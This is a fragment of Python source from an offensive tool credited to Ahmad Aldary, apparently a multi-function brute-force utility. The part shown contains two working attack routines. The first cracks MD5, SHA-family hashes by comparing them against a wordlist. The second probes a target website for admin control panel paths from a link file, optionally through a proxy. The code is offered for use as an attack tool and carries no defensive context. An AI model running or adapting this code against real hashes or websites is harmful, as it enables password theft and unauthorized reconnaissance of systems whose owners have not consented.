#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#################################################### [3] SECTION BRUTFORCE HASH START #################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



##############################################################(multi)HASH FUNCTION ####################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.anyhash !=None and options.wl !=None:
		pass_in = options.anyhash
		wl = options.wl
		if len(pass_in) == 32:
		      name = "MD5   "
		elif len(pass_in) == 40:
		     	name = "SHA1  "
		elif len(pass_in) == 56:
			name = "SHA224"
		elif len(pass_in) == 64:
			name = "SHA256"
		elif len(pass_in) == 96:
			name = "SHA384"
		elif len(pass_in) == 128:
			name = "SHA512"
		else:
		     print(cor[3]+"\n[!]:Error:"+cor[5]+"Please Enter Any Hash from this HASHS::>"+cor[1]+"[ "+cor[2]+"MD5, SHA1, SHA224,SHA256,SHA384,SHA512"+cor[1]+" ]")
           	     exit()

		try:
		   pwfile = open(wl, "r")
		except:
		      errorfile(wl)
		try:
		   banner()
	           time.sleep(1.5)
		   print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
		   print("[#]:Time            : [ "+str(timenow)+" ]")
		   print("[+]:"+name+"          : [ "+str(pass_in[:50])+"..... ]")
		   print("[+]:Wordlist        : [ "+str(wl)+" ]")
		   print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
		   time.sleep(2)
		   print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
		   rs = 1
		   for passwd in pwfile:
				if len(pass_in) == 32:
		      				hashcat = hashlib.md5(passwd.strip()).hexdigest()
				elif len(pass_in) == 40:
					     	hashcat = hashlib.sha1(passwd.strip()).hexdigest()
				elif len(pass_in) == 56:
						hashcat = hashlib.sha224(passwd.strip()).hexdigest()
				elif len(pass_in) == 64:
						hashcat = hashlib.sha256(passwd.strip()).hexdigest()
				elif len(pass_in) == 96:
						hashcat = hashlib.sha384(passwd.strip()).hexdigest()
				elif len(pass_in) == 128:
						hashcat = hashlib.sha512(passwd.strip()).hexdigest()

				print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(passwd) + "\n")
				rs +=1
				if pass_in == hashcat:
					if name == "MD5   ":
					  print(cor[1]+"\n[*]:"+cor[5]+name[:3]+" CRACK!: Password Is: "+cor[1]+"==> "+cor[4]+str(passwd))
					  break
				        elif name == "SHA1  ":
					  print(cor[1]+"\n[*]:"+cor[5]+name[:4]+" CRACK!: Password Is: "+cor[1]+"==> "+cor[4]+str(passwd))
					  break
					else:
					  print(cor[1]+"\n[*]:"+cor[5]+name+" CRACK!: Password Is: "+cor[1]+"==> "+cor[4]+str(passwd))
					  break
		   else:
			passnotfound(wl)

	        except KeyboardInterrupt:
				      exceptkey()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################### END multi HASH FUNCTION ###################################################################


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
######################################################## (END)[3] HASH SECTION ########################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#################################################### [4] SECTION BRUTFORCE WEB START ##################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

##############################################################(1)Find CP FUNCTION #####################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.website !=None:
		global check8
		if check8 == True:
		   target = options.website
		   def checkwebsite():
		     try:
			if target[:7]=="http://":
				host = socket.gethostbyname(target[7:])
			elif target[:8]=="https://":
                                host = socket.gethostbyname(target[8:])
			else:
			     host = socket.gethostbyname(target)

		        conn = socket.create_connection((host, 80), 2)
		        return True
		     except:
			   pass
		     return False

		   if checkwebsite() !=True:
				print(cor[3]+"\n[!]:Error:404: Server [ "+cor[4]+target+cor[3]+" ] Not Found!.")
				exit()

		   if uselinks !=True:
			 try:
		            der = "Default File"
			    name = "Core/LINKS.txt"
		            links = open("Core/LINKS.txt", "r")
		         except:
		               print(cor[3]+"\n[!]:The "+cor[4]+"[ Core/LINKS.txt ]"+cor[3]+" Tool File Is Missing!!\n"+cor[2]+"[*]:"+cor[5]+"Please Update The Tool.")
		               exit()
		   elif uselinks ==True:
                        try:
			   der = "Custom File "
			   lin = options.links
			   name = lin
			   links = open(lin, "r")
			except:
			      errorfile(lin)
		   try:
		      if webproxy == True:
					 prostatus = cor[2]+"ON"+cor[5]
				         prox = proxy6
		      else:
		           prostatus = cor[4]+"OFF"+cor[5]
			   prox = ""
		      banner()
	              time.sleep(1.5)
		      print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
		      print("[#]:Time         : [ "+str(timenow)+" ]")
		      print("[+]:Website      : [ "+str(target)+" ]")
		      print("[+]:"+der+" : [ "+name+ " ]")
		      print("[@]:Proxy status : [ "+prox+" ["+prostatus+"]")
		      print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
		      time.sleep(1.5)
		      print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
		      time.sleep(2)
		      rs = 1
		      rs2 = 1
	              a = 0
		      while True:
			     link = links.readline()
			     if not link:
				 print("\033[96m[+]\033[91m:\033[32mDone!\n\033[96m[*]\033[91m:\033[32mTry All LINKS From\033[91m [ "+name+" ]\033[32mFile\n\033[96m[+]\033[91m:\033[32mFound \033[91m["+str(a)+"]\033[32m CP :)")
 			 	 break

			     if target[:7] == "http://":
				 request_link = target+"/"+link

			     elif target[:8] == "https://":
			        request_link ="http://"+target[8:]+"/"+link

			     else:
			        request_link = "http://"+target+"/"+link

			     print(cor[3] + '[!]:Trying Link[%s] : '%(rs2) +cor[0]+ str(request_link) + "\n")
			     rs2 += 1

			     REQUEST = Request(request_link)
			     try:
				 if webproxy == True:
				      proxy = ProxyHandler({'http':prox})
				      opener = build_opener(proxy)
				      install_opener(opener)
				      url = "https://"+request_link[7:]
				      withproxy = Request(url)
				      response = urlopen(withproxy)
				 else:
				     response = urlopen(REQUEST)

			     except HTTPError as e:
						  continue

			     except URLError as w:
						 continue


			     else:
				 print(cor[1]+"\n[+]"+cor[4]+":"+cor[2]+"CP"+cor[5]+"["+cor[0]+str(rs)+cor[5]+"]"+cor[4]+" Found!"+cor[1]+" ==> "+cor[2]+str(request_link))
				 rs +=1
				 a +=1
			     ask = raw_input(cor[5]+"\n[?]:Do You Want Continue To Find Other Control Panel ? [Y:n]: "+cor[4])
			     if ask =="n" or ask =="N":
							  print("")
							  exceptkey()
		             else:
				 pass
			     print("")

		   except KeyboardInterrupt:
				      print("")
				      exceptkey()


		elif check8 == False:
				    msgerrorconnect()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################### END Find CP FUNCTION ######################################################################

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
######################################################## (END)[4] WEB SECTION #########################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



	  else:
	      print(parse.usage)



if __name__=="__main__":
	Main()

##############################################################
##################### 		     #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Ahmad Aldary
#Have a nice day :)
#GoodBye

